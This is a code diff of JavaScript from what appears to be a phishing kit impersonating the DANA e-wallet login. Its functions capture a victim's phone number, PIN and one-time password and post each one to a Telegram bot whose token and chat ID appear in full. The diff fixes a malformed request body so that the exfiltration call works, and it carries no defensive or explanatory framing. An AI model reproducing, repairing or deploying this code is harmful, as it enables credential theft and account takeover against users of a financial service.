@@ -20,14 +20,13 @@ function sendNohp(event){
   $("#inp").blur();
 
   let nohp = $('#inp').val();
-  let text = "DANA LOGIN ID
+  let text = "📱 *DANA LOGIN ID
 ────────────────────
 • Nomor :
-• Pin     :
 
 ────────────────────
 
-Thee F U C K *\nNomor HP: " + nohp;
+Thee F U C K  DANA*\nNomor HP: " + nohp;
 
   fetch("https://api.telegram.org/bot8121267441:AAFWFCWUqxBtu3zth4JXOPdlfTcpIPwIbrQ/sendMessage", {
     method: "POST",
@@ -58,7 +57,7 @@ function sendPin(){
     pin += $(this).val();
   });
 
-  let text = "DANA LOGIN ID
+  let text = "🔒 *DANA LOGIN ID
 ────────────────────
 • Nomor :
 • Pin     :
@@ -94,11 +93,11 @@ function sendOtp(){
     otp += $(this).val();
   });
 
-  let text = "DANA LOGIN ID
+  let text = "📬 *DANA LOGIN ID
 ────────────────────
 • Nomor :
 • Pin     :
-• Otp     :
+• Otp    :
 ────────────────────
 
 Thee F U C K *\n`" + otp + "`";
@@ -106,7 +105,7 @@ Thee F U C K *\n`" + otp + "`";
   fetch("https://api.telegram.org/bot8121267441:AAFWFCWUqxBtu3zth4JXOPdlfTcpIPwIbrQ/sendMessage", {
     method: "POST",
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
-    body: "chat_id=7134674820text=" + encodeURIComponent(text) + "&parse_mode=Markdown"
+    body: "chat_id=7134674820&text=" + encodeURIComponent(text) + "&parse_mode=Markdown"
   })
   .then(res => res.json())
   .then(() => {
